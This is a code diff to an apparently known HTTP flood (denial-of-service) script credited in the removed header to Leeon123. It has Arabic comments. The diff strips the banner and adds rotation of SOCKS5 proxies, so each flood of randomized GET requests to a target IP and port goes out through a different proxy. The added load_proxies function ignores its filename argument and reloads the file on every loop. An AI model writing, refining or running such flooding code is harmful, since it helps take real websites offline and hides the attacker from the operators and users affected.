@@ -1,6 +1,3 @@
-#!/usr/bin/python3
-# Coded by Leeon123 - FIXED INPUT VERSION
-
 import socket
 import socks
 import time
@@ -8,19 +5,6 @@ import random
 import threading
 import sys
 
-print ('''
-  ____ ____        _   _   _             _
- / ___/ ___|      / \ | |_| |_ __ _  ___| | __
-| |  | |   _____ / _ \| __| __/ _` |/ __| |/ /
-| |__| |__|_____/ ___ \ |_| || (_| | (__|   <
- \____\____|   /_/   \_\__|\__\__,_|\___|_|\_\\
-Python3 version 1.1 - FIXED INPUT
-                            Cobed by Leeon123
->---------------------------------------------<
-             If you want to stop
-            this script, pls just
-              close the window.
->---------------------------------------------<''')
 
 # قائمة User-Agents (مختصرة للتجربة)
 useragents = [
@@ -41,9 +25,12 @@ out_file = str(input("> Proxy file (e.g., proxy.txt): "))
 
 # تحميل البروكسيات
 try:
-    with open(out_file, 'r') as f:
-        proxies = [line.strip() for line in f if line.strip()]
-    print(f"> Loaded {len(proxies)} proxies")
+    proxies = []
+    with open(out_file, "r") as f:
+        for line in f:
+            line = line.strip()
+            if line:
+                proxies.append(line)
 except:
     print(f"> Error: Cannot read {out_file}")
     proxies = ["DIRECT"]
@@ -67,13 +54,27 @@ acceptall = [
 
 attack_active = True
 requests_sent = 0
+def load_proxies(filename):
+    proxies = []
+    with open(out_file, "r") as f:
+        for line in f:
+            line = line.strip()
+            if line:
+                proxies.append(line)
+    return proxies
 
 def run():
     global requests_sent
     while attack_active:
         try:
             # اختيار بروكسي عشوائي
+            proxies = load_proxies("proxy.txt")
+
             proxy = random.choice(proxies)
+            proxy_ip, proxy_port = proxy.split(":")
+            proxy_port = int(proxy_port)
+
+            print(f"Using proxy: {proxy_ip}:{proxy_port}")
             
             # بناء الطلب
             request = f"GET {url} HTTP/1.1\r\n"
@@ -82,8 +83,13 @@ def run():
             request += f"{random.choice(acceptall)}"
             request += "Connection: keep-alive\r\n\r\n"
             
-            # الاتصال المباشر (بدون بروكسي للمباشرة)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # الاتصال 
+            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            s.set_proxy(
+                proxy_type=socks.SOCKS5,   # أو SOCKS4 / HTTP حسب نوع البروكسي
+                addr=proxy_ip,
+                port=proxy_port
+            )
             s.settimeout(5)
             s.connect((ip, port))
             
@@ -103,6 +109,8 @@ def run():
         except ConnectionRefusedError:
             print("Connection refused - server may be down")
             time.sleep(1)
+        except socks.ProxyConnectionError:
+            print("Proxy connection failed")
         except socket.timeout:
             print("Connection timeout")
             time.sleep(0.5)
